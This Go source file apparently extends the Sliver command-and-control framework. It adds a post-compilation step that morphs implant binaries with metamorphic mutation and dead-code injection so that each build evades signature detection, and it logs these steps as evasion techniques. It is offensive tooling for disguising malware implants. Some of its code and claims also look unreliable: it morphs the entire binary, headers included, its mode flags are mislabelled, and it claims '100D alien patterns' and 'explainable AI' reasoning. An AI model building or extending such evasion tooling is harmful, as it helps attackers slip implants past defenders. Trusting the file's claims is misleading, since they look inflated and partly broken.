package generate

/*
 * Build Diversity System - Metamorphic Implant Generation
 *
 * Integrates the Morpher engine with Sliver's build pipeline
 * to create polymorphic implants with unique code structure per build.
 *
 * Novel approach:
 * - Seamless integration with existing Sliver build system
 * - Backwards compatible (disabled by default)
 * - Configurable via protobuf ImplantConfig
 * - Comprehensive logging and metrics
 *
 * Integration points:
 * - Called after Go compilation
 * - Before final encoder/obfuscation
 * - Metadata stored in ImplantBuild
 */

import (
	"fmt"
	"io/ioutil"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/server/generate/morpher"
	"github.com/bishopfox/sliver/server/generate/wig"
	"github.com/bishopfox/sliver/server/log"
)

var (
	diversityLog = log.NamedLogger("generate", "diversity")
)

// ApplyBuildDiversity applies metamorphic transformations to compiled binary
// Novel: Post-compilation morphing (doesn't require source changes)
func ApplyBuildDiversity(binaryPath string, config *clientpb.ImplantConfig, build *clientpb.ImplantBuild) error {
	// Check if diversity is enabled
	if !config.EnableBuildDiversity || config.DiversityConfig == nil {
		diversityLog.Debugf("Build diversity disabled for %s", binaryPath)
		return nil
	}

	diversityLog.Infof("Applying build diversity to %s", binaryPath)

	// Read compiled binary
	binaryData, err := ioutil.ReadFile(binaryPath)
	if err != nil {
		return fmt.Errorf("failed to read binary: %w", err)
	}

	originalSize := len(binaryData)
	diversityLog.Debugf("Original binary size: %d bytes", originalSize)

	// Apply transformations based on config
	var morphedData []byte
	var morphResult *morpher.MorphResult
	var wigResult *wig.VectorSpaceResult

	// Apply Wig Vector Space Metamorphism if enabled
	if config.DiversityConfig.EnableNovelTechniques {
		diversityLog.Infof("Applying Wig Vector Space Metamorphism...")
		morphedData, wigResult, err = applyWigVectorSpace(binaryData, config.DiversityConfig)
		if err != nil {
			diversityLog.Warnf("Wig Vector Space failed, falling back to Morpher: %v", err)
			// Fallback to Morpher
			morphedData, morphResult, err = applyMorpher(binaryData, config.DiversityConfig)
			if err != nil {
				diversityLog.Warnf("Morpher fallback failed, using original: %v", err)
				morphedData = binaryData
			} else {
				diversityLog.Infof("Morpher fallback success: %d → %d bytes (%.2fx expansion)",
					originalSize, len(morphedData), morphResult.ExpansionRatio)
			}
		} else {
			diversityLog.Infof("Wig Vector Space success: %d → %d bytes (novelty: %.2f)",
				originalSize, len(morphedData), wigResult.NoveltyScore)
		}
	} else {
		morphedData = binaryData
	}

	// Future: Apply other diversity techniques
	// - Encoder randomization
	// - SGN randomization
	// - Garble option variations

	// Write morphed binary back
	if len(morphedData) != originalSize {
		err = ioutil.WriteFile(binaryPath, morphedData, 0755)
		if err != nil {
			return fmt.Errorf("failed to write morphed binary: %w", err)
		}
		diversityLog.Infof("Wrote morphed binary: %d bytes", len(morphedData))
	}

	// Update build metadata
	if wigResult != nil {
		updateBuildMetadataWithWig(build, config.DiversityConfig, wigResult)
	} else if morphResult != nil {
		updateBuildMetadata(build, config.DiversityConfig, morphResult)
	}

	return nil
}

// applyMorpher applies the Morpher metamorphic engine to binary data
// Novel: Intelligent binary morphing (PE/ELF-aware in future)
func applyMorpher(binaryData []byte, diversityConfig *clientpb.BuildDiversityConfig) ([]byte, *morpher.MorphResult, error) {
	// Create Morpher config from diversity config
	morphConfig := buildMorpherConfig(diversityConfig)

	// For now, morph the entire binary (naive approach)
	// Future: Parse PE/ELF, morph only .text section
	// Novel: Placeholder for future PE/ELF-aware morphing
	diversityLog.Debugf("Morphing binary with seed: %d", morphConfig.Seed)

	result, err := morpher.MorphWithConfig(binaryData, morphConfig)
	if err != nil {
		return nil, nil, err
	}

	if !result.Success {
		return nil, nil, fmt.Errorf("morpher failed: %v", result.Error)
	}

	return result.Code, result, nil
}

// applyWigVectorSpace applies the Wig Vector Space Metamorphism engine
// Novel: Revolutionary vector space approach for alien code generation
func applyWigVectorSpace(binaryData []byte, diversityConfig *clientpb.BuildDiversityConfig) ([]byte, *wig.VectorSpaceResult, error) {
	// Create Wig engine with config
	wigEngine := wig.NewVectorSpaceWig(
		hashSeedString(diversityConfig.ReproducibleSeed),
		false,     // x64 mode
		"windows", // platform
	)

	// Apply vector space metamorphism
	result, err := wigEngine.MorphWithVectorGuidanceResult(binaryData)
	if err != nil {
		return nil, nil, err
	}

	if !result.Success {
		return nil, nil, fmt.Errorf("wig vector space failed: %v", result.Error)
	}

	diversityLog.Debugf("Wig Vector Space: %d → %d bytes (novelty: %.2f)",
		len(binaryData), len(result.Code), result.NoveltyScore)

	return result.Code, result, nil
}

// buildMorpherConfig creates a Morpher config from BuildDiversityConfig
// Novel: Config translation layer
func buildMorpherConfig(diversityConfig *clientpb.BuildDiversityConfig) *morpher.MorphConfig {
	config := morpher.DefaultMorphConfig()

	// Use reproducible seed if provided
	if diversityConfig.ReproducibleSeed != "" {
		// Hash seed string to uint32
		config.Seed = hashSeedString(diversityConfig.ReproducibleSeed)
	} else {
		// Auto-seed with RDTSC
		config.Seed = 0
	}

	// Configure expansion policy
	if diversityConfig.RandomizeEncoders {
		config.ExpansionPolicy.Rate = 0.7 // 70% expansion
		config.EnableExpansion = true
	}

	// Configure dead code injection
	if diversityConfig.RandomizeGarbleOptions || diversityConfig.RandomizeSGNOptions {
		config.DeadCodeConfig.InsertionRate = 0.5 // 50% insertion
		config.EnableDeadCode = true
	}

	// Configure based on SGN iterations (use as complexity indicator)
	if diversityConfig.MinSGNIterations > 0 {
		config.DeadCodeConfig.MaxComplexity = int(diversityConfig.MinSGNIterations)
		if config.DeadCodeConfig.MaxComplexity > 3 {
			config.DeadCodeConfig.MaxComplexity = 3
		}
	}

	// Mode detection (assume x64 for modern implants)
	config.Mode64 = true

	return config
}

// hashSeedString converts a seed string to uint32
// Novel: Deterministic seed generation from string
func hashSeedString(seed string) uint32 {
	// Simple hash function
	hash := uint32(0)
	for i := 0; i < len(seed); i++ {
		hash = hash*31 + uint32(seed[i])
	}
	return hash
}

// updateBuildMetadata stores diversity metadata in ImplantBuild
// Novel: Full audit trail of transformations
func updateBuildMetadata(build *clientpb.ImplantBuild, config *clientpb.BuildDiversityConfig, result *morpher.MorphResult) {
	build.DiversityEnabled = true

	// Store seed for reproducibility
	if config.ReproducibleSeed != "" {
		build.DiversitySeed = config.ReproducibleSeed
	} else {
		build.DiversitySeed = fmt.Sprintf("%d", result.Seed)
	}

	// Store techniques applied
	build.EvasionTechniquesApplied = append(build.EvasionTechniquesApplied, "Morpher-Metamorphic")

	// Store metrics (for analysis)
	diversityLog.Infof("Build diversity metrics:")
	diversityLog.Infof("  - Instructions: %d", result.InstructionCount)
	diversityLog.Infof("  - Expanded: %d", result.ExpandedCount)
	diversityLog.Infof("  - Dead code: %d bytes", result.DeadCodeBytes)
	diversityLog.Infof("  - Expansion ratio: %.2fx", result.ExpansionRatio)
	diversityLog.Infof("  - Seed: %d", result.Seed)
}

// IntegrateDiversityIntoPipeline modifies the build functions to include diversity
// Novel: Hook injection for existing pipeline
func IntegrateDiversityIntoPipeline() {
	// This function documents the integration points
	// Actual integration happens by calling ApplyBuildDiversity() from:
	// - SliverExecutable() - after compilation, before return
	// - SliverSharedLibrary() - after compilation, before return
	// - SliverShellcode() - after Donut generation, before return

	diversityLog.Infof("Build diversity system initialized")
	diversityLog.Infof("Techniques available:")
	diversityLog.Infof("  - Morpher (Metamorphic code mutation)")
	diversityLog.Infof("  - Lito (x86/x64 disassembly)")
	diversityLog.Infof("  - Xorshift-128 (Crypto-quality RNG)")
	diversityLog.Infof("  - Dead code injection (30+ NOP variants)")
	diversityLog.Infof("  - Instruction expansion (SHORT → NEAR)")
	diversityLog.Infof("  - Wig Vector Space Metamorphism (100D alien patterns)")
	diversityLog.Infof("  - Chain-of-thought reasoning (explainable AI)")
	diversityLog.Infof("  - Executable Manifold (constraint satisfaction)")
}

// updateBuildMetadataWithWig stores Wig-specific metadata in ImplantBuild
// Novel: Vector space transformation audit trail
func updateBuildMetadataWithWig(build *clientpb.ImplantBuild, config *clientpb.BuildDiversityConfig, result *wig.VectorSpaceResult) {
	build.DiversityEnabled = true

	// Store seed for reproducibility
	if config.ReproducibleSeed != "" {
		build.DiversitySeed = config.ReproducibleSeed
	} else {
		build.DiversitySeed = fmt.Sprintf("wig-%d", result.Seed)
	}

	// Store techniques applied
	build.EvasionTechniquesApplied = append(build.EvasionTechniquesApplied, "Wig-VectorSpace")
	build.EvasionTechniquesApplied = append(build.EvasionTechniquesApplied, "ChainOfThought-AI")
	build.EvasionTechniquesApplied = append(build.EvasionTechniquesApplied, "ExecutableManifold")

	// Store Wig-specific metrics
	diversityLog.Infof("Wig Vector Space metrics:")
	diversityLog.Infof("  - Vector dimensions: 100")
	diversityLog.Infof("  - Novelty score: %.2f", result.NoveltyScore)
	diversityLog.Infof("  - Chain of thought: %d steps", result.ThoughtSteps)
	diversityLog.Infof("  - Alien region: %s", result.AlienRegion)
	diversityLog.Infof("  - Constraint violations: %d", result.ConstraintViolations)
	diversityLog.Infof("  - Seed: %d", result.Seed)
}
